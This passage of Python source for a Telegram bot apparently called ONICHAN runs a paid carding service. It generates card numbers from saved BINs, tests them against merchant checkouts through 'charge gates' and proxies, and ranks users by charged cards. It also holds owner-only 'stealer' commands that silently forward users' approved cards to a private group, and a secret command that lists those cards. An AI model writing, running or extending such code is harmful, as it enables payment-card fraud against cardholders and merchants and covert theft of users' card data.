            f"📅 Since 〝 {since_str}\n\n"
            f"✅ All-Time Stats\n"
            f"├ Total Checked 〝 {total:,}\n"
            f"├ Charged/Live 〝 {approved:,}\n"
            f"├ Declined 〝 {declined:,}\n"
            f"└ Success Rate 〝 {rate}%"
        )
        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Ranking ────────────────────────────────────────────────────
    if data == "hit_ranking":
        await query.answer()
        board = _get_hit_leaderboard(limit=10)
        if not board:
            text = ae("[ 👑 RANKING ]\n\nNo hitter data yet. Be the first to hit!")
        else:
            medals = ["🥇", "🥈", "🥉"] + ["🎯"] * 10
            lines  = ["[ 👑 HITTER RANKING — Top Charged ]\n"]
            for pos, (uid, info) in enumerate(board):
                medal = medals[pos] if pos < len(medals) else f"#{pos+1}"
                uname = html.escape(info['username'] or uid)
                cnt   = info['count']
                you   = " ← you" if str(user.id) == uid else ""
                lines.append(f"{medal} @{uname} — {cnt} hit(s){you}")
            text = ae("\n".join(lines))
        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Saved BINs ─────────────────────────────────────────────────
    if data == "hit_savedbins":
        await query.answer()
        saved = get_user_saved_bins(user.id)
        if not saved:
            text = ae(
                f"[ 💾 SAVED BINS ]\n\n"
                f"No BINs saved yet.\n\n"
                f"Save one with:\n"
                f"<code>/savebin name 453201</code>"
            )
        else:
            lines = [f"[ 💾 SAVED BINS ({len(saved)}) ]\n"]
            for b in saved:
                lines.append(f"💳 <code>{html.escape(b['name'])}</code> ➜ <code>{html.escape(b['bin_value'])}</code>")
            lines.append(f"\n<code>/savebin &lt;name&gt; &lt;bin&gt;</code> — Save")
            lines.append(f"<code>/deletebin &lt;name&gt;</code> — Remove")
            text = ae("\n".join(lines))
        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Plans ──────────────────────────────────────────────────────
    if data == "hit_plans":
        await query.answer()
        plans = get_all_plans()
        lines = ["[ 📋 PLANS & PRICING ]\n"]
        plan_icons = {"free": "🆓", "tier1": "⭐", "tier2": "💎", "tier3": "💠"}
        for key, plan in plans.items():
            icon = plan_icons.get(key, "📦")
            price = plan.get('price', '?')
            currency = plan.get('currency', '$')
            name = plan.get('name', key)
            days = plan.get('duration_days', 0)
            lines.append(f"{icon} <b>{html.escape(name)}</b> — {currency}{price} ({days}d)")
        lines.append(
            f"\n<b>Credit System</b>\n"
            f"• 1 Charged Card = 5 credits\n"
            f"• Declined = Free (no cost)\n\n"
            f"<b>How to get premium:</b>\n"
            f"1. Contact @{SUPPORT_USERNAME}\n"
            f"2. Use /buy to purchase\n"
            f"3. Redeem code: /redeem CODE"
        )
        kb = InlineKeyboardMarkup([
            [_btn("💬 Contact", style="primary", url=f"https://t.me/{SUPPORT_USERNAME}")],
            [_btn("🏠 Back", style="default", callback_data="hit_home")],
        ])
        text = ae("\n".join(lines))
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Settings ───────────────────────────────────────────────────
    if data == "hit_settings":
        await query.answer()
        proxy_mode = get_user_proxy_mode(user.id)
        site_mode  = get_user_show_site(user.id)
        user_proxies = ah_get_user_proxies(user.id)

        proxy_label = "🌐 System Proxy" if proxy_mode == "system" else f"🔒 Own Proxy ({len(user_proxies)} saved)"
        site_label  = "👁 Always Show" if site_mode == "always" else "❓ Ask Every Time"
        proxy_count = f"{len(user_proxies)} saved" if user_proxies else "None — add with /proxy add"

        text = ae(
            f"[ ⚙️ SETTINGS ]\n\n"
            f"🔌 <b>Proxy Mode:</b> {proxy_label}\n"
            f"<i>System Proxy uses hosting IP (no proxy)</i>\n\n"
            f"🌍 <b>Show Site (Public):</b> {site_label}\n"
            f"<i>Controls merchant visibility in channel</i>\n\n"
            f"📋 <b>Your Proxies:</b> {proxy_count}\n\n"
            f"<code>/proxy add host:port:user:pass</code>\n"
            f"<code>/proxy del host:port:user:pass</code>\n"
            f"<code>/proxy test</code> — Test your proxies\n"
            f"<code>/ipcheck</code> — Check IP fraud score"
        )
        toggle_proxy_label = "✅ Switch to Own Proxy" if proxy_mode == "system" else "✅ Switch to System Proxy"
        toggle_proxy_cb    = "hit_toggle_proxy"
        toggle_site_label  = "👁 Set: Always Show" if site_mode == "ask" else "❓ Set: Ask Every Time"
        toggle_site_cb     = "hit_toggle_site"
        kb = InlineKeyboardMarkup([
            [_btn(toggle_proxy_label, style="success", callback_data=toggle_proxy_cb)],
            [_btn(toggle_site_label,  style="primary", callback_data=toggle_site_cb)],
            [_btn("🏠 Back", style="default", callback_data="hit_home")],
        ])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Toggle Proxy Mode ──────────────────────────────────────────
    if data == "hit_toggle_proxy":
        current = get_user_proxy_mode(user.id)
        if current == "system":
            user_proxies = ah_get_user_proxies(user.id)
            if not user_proxies:
                await query.answer("Add a proxy first with /proxy add", show_alert=True)
                return
            set_user_proxy_mode(user.id, "own")
            await query.answer("Switched to Own Proxy ✅", show_alert=False)
        else:
            set_user_proxy_mode(user.id, "system")
            await query.answer("Switched to System Proxy ✅", show_alert=False)
        # Re-render settings
        context.args = []
        data = "hit_settings"
        # Fall through to settings render by reusing callback logic:
        proxy_mode   = get_user_proxy_mode(user.id)
        site_mode    = get_user_show_site(user.id)
        user_proxies = ah_get_user_proxies(user.id)
        proxy_label  = "🌐 System Proxy" if proxy_mode == "system" else f"🔒 Own Proxy ({len(user_proxies)} saved)"
        site_label   = "👁 Always Show" if site_mode == "always" else "❓ Ask Every Time"
        proxy_count  = f"{len(user_proxies)} saved" if user_proxies else "None — add with /proxy add"
        text = ae(
            f"[ ⚙️ SETTINGS ]\n\n"
            f"🔌 <b>Proxy Mode:</b> {proxy_label}\n"
            f"<i>System Proxy uses hosting IP (no proxy)</i>\n\n"
            f"🌍 <b>Show Site (Public):</b> {site_label}\n"
            f"<i>Controls merchant visibility in channel</i>\n\n"
            f"📋 <b>Your Proxies:</b> {proxy_count}\n\n"
            f"<code>/proxy add host:port:user:pass</code>\n"
            f"<code>/proxy del host:port:user:pass</code>\n"
            f"<code>/proxy test</code> — Test your proxies\n"
            f"<code>/ipcheck</code> — Check IP fraud score"
        )
        toggle_proxy_label = "✅ Switch to Own Proxy" if proxy_mode == "system" else "✅ Switch to System Proxy"
        toggle_site_label  = "👁 Set: Always Show" if site_mode == "ask" else "❓ Set: Ask Every Time"
        kb = InlineKeyboardMarkup([
            [_btn(toggle_proxy_label, style="success", callback_data="hit_toggle_proxy")],
            [_btn(toggle_site_label,  style="primary", callback_data="hit_toggle_site")],
            [_btn("🏠 Back", style="default", callback_data="hit_home")],
        ])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Dashboard: Toggle Show Site ───────────────────────────────────────────
    if data == "hit_toggle_site":
        current = get_user_show_site(user.id)
        new_mode = "ask" if current == "always" else "always"
        set_user_show_site(user.id, new_mode)
        label = "Always Show" if new_mode == "always" else "Ask Every Time"
        await query.answer(f"Show Site set to: {label} ✅", show_alert=False)
        proxy_mode   = get_user_proxy_mode(user.id)
        site_mode    = new_mode
        user_proxies = ah_get_user_proxies(user.id)
        proxy_label  = "🌐 System Proxy" if proxy_mode == "system" else f"🔒 Own Proxy ({len(user_proxies)} saved)"
        site_label   = "👁 Always Show" if site_mode == "always" else "❓ Ask Every Time"
        proxy_count  = f"{len(user_proxies)} saved" if user_proxies else "None — add with /proxy add"
        text = ae(
            f"[ ⚙️ SETTINGS ]\n\n"
            f"🔌 <b>Proxy Mode:</b> {proxy_label}\n"
            f"<i>System Proxy uses hosting IP (no proxy)</i>\n\n"
            f"🌍 <b>Show Site (Public):</b> {site_label}\n"
            f"<i>Controls merchant visibility in channel</i>\n\n"
            f"📋 <b>Your Proxies:</b> {proxy_count}\n\n"
            f"<code>/proxy add host:port:user:pass</code>\n"
            f"<code>/proxy del host:port:user:pass</code>\n"
            f"<code>/proxy test</code> — Test your proxies\n"
            f"<code>/ipcheck</code> — Check IP fraud score"
        )
        toggle_proxy_label = "✅ Switch to Own Proxy" if proxy_mode == "system" else "✅ Switch to System Proxy"
        toggle_site_label  = "👁 Set: Always Show" if site_mode == "ask" else "❓ Set: Ask Every Time"
        kb = InlineKeyboardMarkup([
            [_btn(toggle_proxy_label, style="success", callback_data="hit_toggle_proxy")],
            [_btn(toggle_site_label,  style="primary", callback_data="hit_toggle_site")],
            [_btn("🏠 Back", style="default", callback_data="hit_home")],
        ])
        try:
            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except:
            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ── Existing: close / stop ────────────────────────────────────────────────
    if data.startswith("hitclose_"):
        hit_key = data.replace("hitclose_", "")
        _pending_hits.pop(hit_key, None)
        await query.answer("Closed")
        await query.message.delete()
        return
    
    if data.startswith("hitstop_"):
        hit_key = data.replace("hitstop_", "")
        _active_hits[hit_key] = False
        await query.answer("Stopping...")
        return

    # Saved BIN picker callback
    if data.startswith("sbin_cancel_"):
        await query.answer("Cancelled.")
        try:
            await query.message.delete()
        except:
            pass
        return

    if data.startswith("sbin_"):
        parts = data.split("_", 2)
        if len(parts) < 3:
            await query.answer("Invalid selection.", show_alert=True)
            return
        _, uid_str, bin_name = parts[0], parts[1], parts[2]
        try:
            uid = int(uid_str)
        except ValueError:
            await query.answer("Invalid user.", show_alert=True)
            return
        if query.from_user.id != uid:
            await query.answer("This is not your session.", show_alert=True)
            return
        pending = _pending_bin_hits.pop(uid, None)
        url = pending["url"] if pending else None

        # Fallback: extract URL from the original /hit command message
        if not url:
            try:
                orig = query.message.reply_to_message
                if orig and orig.text:
                    m = re.search(r'https?://\S+', orig.text)
                    if m:
                        url = m.group(0)
            except Exception:
                pass

        if not url:
            await query.answer("Session expired! Send /hit again.", show_alert=True)
            return
        saved = get_user_saved_bins(uid)
        chosen = next((b for b in saved if b["name"] == bin_name), None)
        if not chosen:
            await query.answer("BIN not found.", show_alert=True)
            return
        await query.answer(f"Generating from BIN {chosen['bin_value'][:6]}...")
        try:
            await query.message.delete()
        except:
            pass
        gen_result = parse_gen_input(chosen["bin_value"])
        if gen_result:
            prefix, mm, yy, cvv_pat = gen_result
            gen_lines = generate_cards_from_bin(prefix, mm, yy, cvv_pat, 10)
            cards = auto_hitter_parse_cards("\n".join(gen_lines))
        else:
            cards = []
        if not cards:
            await query.message.reply_text(ae("❌ Could not generate cards from saved BIN."))
            return
        loading_msg = await context.bot.send_message(
            chat_id=query.message.chat.id,
            text=ae(f"⚡ <b>Fetching checkout...</b>\n<i>BIN: {html.escape(chosen['bin_value'][:6])}*** ({len(cards)} cards)</i>"),
            parse_mode=ParseMode.HTML
        )
        await _run_auto_hit(query, context, url, cards, loading_msg)
        return




async def set_stealer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set stealer group ID - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        current_id = get_stealer_group_id()
        if current_id:
            await update.message.reply_text(
                f"🔐 <b>STEALER GROUP</b>\n\n"
                f"📊 <b>Current Group ID:</b> <code>{current_id}</code>\n\n"
                f"💡 <b>Usage:</b> <code>/setstealer [group_id]</code>\n"
                f"🗑️ <b>To disable:</b> <code>/setstealer off</code>",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(
                f"🔐 <b>STEALER GROUP</b>\n\n"
                f"⚠️ <b>Not configured</b>\n\n"
                f"💡 <b>Usage:</b> <code>/setstealer [group_id]</code>\n\n"
                f"📋 <b>How to get Group ID:</b>\n"
                f"1. Add bot to your private group\n"
                f"2. Send /getid in that group\n"
                f"3. Copy the Chat ID and use it here",
                parse_mode=ParseMode.HTML
            )
        return
    
    arg = context.args[0].lower()
    
    if arg == "off" or arg == "disable" or arg == "none":
        if set_stealer_group_id(None):
            await update.message.reply_text(
                "✅ <b>Stealer Disabled!</b>\n\n"
                "Approved cards will no longer be sent to a group.",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(ae("❌ Error disabling stealer!"))
        return
    
    try:
        group_id = int(context.args[0])
        
        if set_stealer_group_id(group_id):
            await update.message.reply_text(
                f"✅ <b>Stealer Group Set!</b>\n\n"
                f"📊 <b>Group ID:</b> <code>{group_id}</code>\n\n"
                f"🔥 All approved/live/charged cards will now be automatically sent to this group!",
                parse_mode=ParseMode.HTML
            )
        else:
            await update.message.reply_text(ae("❌ Error setting stealer group!"))
    except ValueError:
        await update.message.reply_text(
            "❌ <b>Invalid Group ID!</b>\n\n"
            "Group ID must be a number (usually negative for groups).\n\n"
            "💡 Use /getid in your group to get the correct ID.",
            parse_mode=ParseMode.HTML
        )

async def test_stealer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test stealer by sending a test message - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stealer_group_id = get_stealer_group_id()
    
    if not stealer_group_id:
        await update.message.reply_text(
            "❌ <b>Stealer Not Configured!</b>\n\n"
            "Use /setstealer [group_id] to set up first.\n"
            "Use /getid in your group to get the Chat ID.",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        from datetime import datetime
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        test_message = f"""🧪 <b>STEALER TEST MESSAGE</b> 🧪

━━━━━━━━━━━━━━━━━━━━━━

✅ <b>Stealer is working!</b>

📊 <b>Group ID:</b> <code>{stealer_group_id}</code>
👤 <b>Tested by:</b> @{user.username or user.first_name}
⏰ <b>Time:</b> {timestamp}

━━━━━━━━━━━━━━━━━━━━━━

🔥 Approved cards will be sent here automatically!"""

        await context.bot.send_message(
            chat_id=stealer_group_id,
            text=test_message,
            parse_mode='HTML'
        )
        
        await update.message.reply_text(
            f"✅ <b>Test Successful!</b>\n\n"
            f"Message sent to group <code>{stealer_group_id}</code>\n\n"
            f"Check your stealer group for the test message!",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        error_msg = str(e)
        await update.message.reply_text(
            f"❌ <b>Test Failed!</b>\n\n"
            f"<b>Error:</b> {error_msg}\n\n"
            f"<b>Possible fixes:</b>\n"
            f"1. Make sure the bot is added to the group\n"
            f"2. Make sure the bot has permission to send messages\n"
            f"3. Verify the group ID is correct (use /getid in the group)\n"
            f"4. Group IDs are usually negative (like -1001234567890)",
            parse_mode=ParseMode.HTML
        )

async def list_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all admins - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_OWNER, 'r') as f:
            admins = [int(line.strip()) for line in f if line.strip().isdigit()]
    except:
        admins = []
    
    text = ae(f"""👑 <b>ADMIN LIST</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Total Admins:</b> {len(admins)}

━━━━━━━━━━━━━━━━━━━━━━

👥 <b>Admins:</b>

""")
    
    for i, admin_id in enumerate(admins, 1):
        # Try to get username
        try:
            admin_user = await context.bot.get_chat(admin_id)
            admin_name = f"@{admin_user.username}" if admin_user.username else admin_user.first_name
        except:
            admin_name = "Unknown"
        
        owner_badge = " 👑" if admin_id == OWNER_ID else ""
        text += f"<b>{i}.</b> {admin_name}{owner_badge}\n"
        text += f"   🆔 <code>{admin_id}</code>\n\n"
    
    text += f"""━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Commands:</b>
<code>/addadmin [id]</code> - Add admin
<code>/removeadmin [id]</code> - Remove admin
<code>/admins</code> - View all admins"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all users - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    try:
        with open(DB_OWNER, 'r') as f:
            owners = [l.strip() for l in f if l.strip()]
        with open(DB_PREMIUM, 'r') as f:
            premium = [l.strip() for l in f if l.strip()]
        with open(DB_FREE, 'r') as f:
            free = [l.strip() for l in f if l.strip()]
    except:
        owners = premium = free = []
    
    text = ae(f"""👥 <b>ALL USERS</b>

👑 <b>Admins:</b> {len(owners)}
💎 <b>Premium:</b> {len(premium)}
🆓 <b>Free:</b> {len(free)}
📊 <b>Total:</b> {len(set(owners + premium + free))}

<b>Recent Users:</b>
""")
    
    # Show recent free users
    for i, user_line in enumerate(free[-5:], 1):
        text += f"{i}. <code>{user_line}</code>\n"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def secret_approved(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SECRET: View all approved cards - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        return  # Silent fail for security
    
    approved_cards = get_approved_cards(30)
    total_count = get_approved_count()
    
    if not approved_cards:
        await update.message.reply_text(ae("🔒 <b>No approved cards yet</b>"), parse_mode=ParseMode.HTML)
        return
    
    text = ae(f"""🔒 <b>SECRET - APPROVED CARDS</b> 🔒

📊 <b>Total Approved:</b> {total_count}
📋 <b>Showing Last:</b> {len(approved_cards)}

━━━━━━━━━━━━━━━━━━━━━━

""")
    
    for i, card_line in enumerate(approved_cards[-20:], 1):
        parts = card_line.split('|')
        if len(parts) >= 4:
            timestamp = parts[0]
            user_id = parts[1]
            username = parts[2]
            card = parts[3]
            text += f"<b>{i}.</b> <code>{card}</code>\n"
            text += f"   👤 {username} | ⏰ {timestamp}\n\n"
    
    text += f"""━━━━━━━━━━━━━━━━━━━━━━

🔒 <b>This is a secret command</b>
📁 Full log: Database/approved_log.txt"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def revenue_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """View revenue statistics - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stats = get_payment_stats()
    total_revenue = get_total_revenue()
    
    text = ae(f"""💰 <b>REVENUE STATISTICS</b>

━━━━━━━━━━━━━━━━━━━━━━

💵 <b>Total Revenue:</b> ${total_revenue:.2f}
📊 <b>Total Sales:</b> {stats['count']}
💎 <b>Average Sale:</b> ${total_revenue/stats['count'] if stats['count'] > 0 else 0:.2f}

━━━━━━━━━━━━━━━━━━━━━━

📋 <b>Sales by Plan:</b>

""")
    
    for plan_name, count in stats['plans'].items():
        text += f"• {plan_name}: {count} sales\n"
    
    text += f"""
━━━━━━━━━━━━━━━━━━━━━━

📞 <b>Contact:</b> @tu_bkl_hai
📢 <b>Channel:</b> @krishnaslounge"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def generate_premium_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate premium key - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/genkey [days] [count]</code>\n\n"
            "💡 <b>Examples:</b>\n"
            "<code>/genkey 7</code> - 1 key for 7 days\n"
            "<code>/genkey 10 5</code> - 5 keys for 10 days\n"
            "<code>/genkey 30 10</code> - 10 keys for 30 days",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        days = int(context.args[0])
        count = int(context.args[1]) if len(context.args) > 1 else 1
        
        if days < 1:
            await update.message.reply_text(ae("❌ Days must be at least 1!"))
            return
        
        if count < 1 or count > 50:
            await update.message.reply_text(ae("❌ Count must be between 1 and 50!"))
            return
        
        # Show generating message
        status_msg = await update.message.reply_text(ae(f"⏳ Generating {count} key(s) for {days} days..."))
        
        # Generate keys in thread pool to avoid blocking (database uses sync calls)
        loop = asyncio.get_running_loop()
        try:
            keys = await asyncio.wait_for(
                loop.run_in_executor(None, create_batch_keys, count, days, user.id),
                timeout=30.0
            )
        except asyncio.TimeoutError:
            await status_msg.edit_text(
                "❌ <b>Timeout generating keys!</b>\n\n"
                "Database took too long to respond.\n"
                "Please try again.",
                parse_mode=ParseMode.HTML
            )
            return
        
        if not keys:
            await status_msg.edit_text(
                "❌ <b>Error generating keys!</b>\n\n"
                "Database connection may have issues.\n"
                "Please try again in a moment.",
                parse_mode=ParseMode.HTML
            )
            return
        
        # Format with nice UI
        text = format_keys_display(keys, days)
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
        
    except ValueError:
        await update.message.reply_text(ae("❌ Days and count must be numbers!"))
    except Exception as e:
        import traceback
        print(f"[GenKey] Error: {e}\n{traceback.format_exc()}")
        await update.message.reply_text(ae(f"❌ Error: {str(e)}"))

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Broadcast message to all users - Owner/Admin only"""
    user = update.effective_user
    
    # Admin check
    ADMIN_IDS = [8119946836, 8268257476, 8271254197]
    if user.id not in ADMIN_IDS:
        await update.message.reply_text(ae("❌ Admin only!"))
        return
    
    if not context.args:
        await update.message.reply_text(
            "📢 <b>Broadcast Command</b>\n\n"
            "<b>Usage:</b> <code>/broadcast your message</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast 🔥 New gate added! Check /pp</code>\n\n"
            "⚠️ <i>This sends to ALL bot users!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    raw_text = update.message.text
    prefix = raw_text.split(None, 1)
    if len(prefix) < 2:
        await update.message.reply_text(
            "📢 <b>Broadcast Command</b>\n\n"
            "<b>Usage:</b> <code>/broadcast your message</code>\n\n"
            "⚠️ <i>This sends to ALL bot users!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    message = prefix[1]
    
    from modules.database import get_approved_users_sync
    
    status_msg = await update.message.reply_text(ae("📢 <b>Broadcasting...</b>"), parse_mode=ParseMode.HTML)
    
    try:
        loop = asyncio.get_running_loop()
        users = await loop.run_in_executor(None, get_approved_users_sync)
        
        if not users:
            await status_msg.edit_text(ae("❌ No users found!"))
            return
        
        success = 0
        failed = 0
        
        for user_id in users:
            try:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=message
                )
                success += 1
                await asyncio.sleep(0.1)
            except Exception as e:
                error_msg = str(e).lower()
                if "blocked" in error_msg or "deactivated" in error_msg or "not found" in error_msg:
                    failed += 1
                else:
                    try:
                        await asyncio.sleep(1)
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=message
                        )
                        success += 1
                    except:
                        failed += 1
        
        await status_msg.edit_text(
            f"✅ <b>Broadcast Complete!</b>\n\n"
            f"📨 <b>Sent:</b> {success}\n"
            f"❌ <b>Failed:</b> {failed}\n"
            f"👥 <b>Total:</b> {len(users)}",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ Error: {str(e)}"))

async def redeem_premium_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeem premium key - Any user"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/redeem ONICHAN-XXXX-XXXX-XXXX</code>\n\n"
            "💡 <b>Example:</b>\n"
            "<code>/redeem ONICHAN-AB12-CD34-EF56</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    key = context.args[0].upper()
    
    # Validate key format (accept both ONICHAN and MOMO for backwards compatibility)
    if not key.startswith("ONICHAN-") and not key.startswith("MOMO-"):
        await update.message.reply_text(ae("❌ Invalid key format!"))
        return
    
    # Redeem key in thread pool to avoid blocking
    status_msg = await update.message.reply_text(ae("⏳ Redeeming key..."))
    
    loop = asyncio.get_running_loop()
    try:
        result = await asyncio.wait_for(
            loop.run_in_executor(None, redeem_key, key, user.id, user.username or user.first_name),
            timeout=15.0
        )
    except asyncio.TimeoutError:
        await status_msg.edit_text(ae("❌ Timeout! Please try again."), parse_mode=ParseMode.HTML)
        return
    except Exception as e:
        await status_msg.edit_text(ae(f"❌ Error: {str(e)}"), parse_mode=ParseMode.HTML)
        return
    
    if result['success']:
        # Add to premium users - update PostgreSQL first
        from datetime import datetime, timedelta
        from modules.database import set_premium_sync, add_user_sync
        
        expiry = datetime.now() + timedelta(days=result['days'])
        expiry_str = expiry.strftime("%Y-%m-%d")
        
        # Ensure user exists in database first
        add_user_sync(user.id, user.username or user.first_name, "approved")
        
        # Set premium in PostgreSQL database
        set_premium_sync(user.id, result['days'])
        invalidate_user_cache(user.id)  # flush permission cache

        # Also write to local file as backup
        try:
            with open(DB_PREMIUM, 'a') as f:
                f.write(f"{user.id} {expiry_str}\n")
        except:
            pass
        
        text = ae(f"""✅ <b>KEY REDEEMED SUCCESSFULLY!</b>

━━━━━━━━━━━━━━━━━━━━━━

🎉 <b>Congratulations!</b>
You now have premium access!

⏰ <b>Duration:</b> {result['days']} days
📅 <b>Expires:</b> {result['expiry_date']}

━━━━━━━━━━━━━━━━━━━━━━

💎 <b>Premium Features Unlocked:</b>
• 20 cards per mass check
• All 18 charge gates
• Priority support
• No cooldown

━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Start using premium features now!</b>
Send /help to see all commands.""")
        
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
        
        # Notify owner
        try:
            await context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🔑 <b>Key Redeemed!</b>\n\n"
                     f"👤 User: @{user.username or user.first_name}\n"
                     f"🆔 ID: <code>{user.id}</code>\n"
                     f"🎫 Key: <code>{key}</code>\n"
                     f"⏰ Duration: {result['days']} days",
                parse_mode=ParseMode.HTML
            )
        except:
            pass
    else:
        await status_msg.edit_text(ae(f"❌ {result['message']}"), parse_mode=ParseMode.HTML)

async def list_keys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all premium keys - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stats = get_key_stats()
    active_keys = get_active_keys()
    
    text = ae(f"""🔑 <b>PREMIUM KEYS</b>

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Statistics:</b>
• Total Keys: {stats['total']}
• Active: {stats['active']}
• Redeemed: {stats['redeemed']}

━━━━━━━━━━━━━━━━━━━━━━

🎫 <b>Active Keys:</b>

""")
    
    if active_keys:
        for i, key in enumerate(active_keys[-10:], 1):
            text += f"<b>{i}.</b> <code>{key['key']}</code>\n"
            text += f"   ⏰ {key['days']} days | 📅 {key['timestamp']}\n\n"
        
        if len(active_keys) > 10:
            text += f"<i>...and {len(active_keys) - 10} more keys</i>\n\n"
    else:
        text += "No active keys.\n\n"
    
    text += f"""━━━━━━━━━━━━━━━━━━━━━━

💡 <b>Commands:</b>
<code>/genkey [days]</code> - Generate new key
<code>/keys</code> - View all keys"""
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)

async def burn_keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Burn all unused premium keys - Owner only"""
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    
    stats = get_key_stats()
    
    if stats['active'] == 0:
        await update.message.reply_text(
            "ℹ️ <b>No unused keys to burn!</b>\n\n"
            "All keys have already been redeemed.",
            parse_mode=ParseMode.HTML
        )
        return
    
    result = burn_unused_keys()
    
    if result['success']:
        text = ae(f"""🔥 <b>KEYS BURNED SUCCESSFULLY!</b>

━━━━━━━━━━━━━━━━━━━━━━

🗑️ <b>Burned:</b> {result['count']} unused keys
✅ <b>Status:</b> All unredeemed keys deleted

━━━━━━━━━━━━━━━━━━━━━━

📊 <b>Remaining:</b>
• Active Keys: 0
• Redeemed Keys: {stats['redeemed']}

💡 Use <code>/genkey [days]</code> to create new keys.""")
    else:
        text = f"❌ <b>Error burning keys!</b>\n\n{result['message']}"
    
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ============================================================================
# HELP COMMAND - SHOW ALL COMMANDS
# ============================================================================

@require_approval
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show all available commands"""
    user = update.effective_user
    rank = get_user_rank(user.id)
    is_owner_user = is_owner(user.id)
    is_premium_user = is_premium(user.id)
    
    gif_url = get_sexy_anime_gif("welcome")
    
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(f"""💜 <b>ONICHAN • HELP</b>
{sep}
👤 {rank} | 📊 Limit: {get_mass_check_limit(user.id)} cards
{sep}
🔰 <b>BASIC</b>
/start · /help · /info · /redeem
{sep}
🚪 <b>FREE GATES</b>
/st Stripe · /bu Braintree · /sq Square
{sep}
🔧 <b>TOOLS</b>
/gen · /bin · /fake · /web · /proxy
/scr · /tmail · /cmail · /sk · /config
{sep}
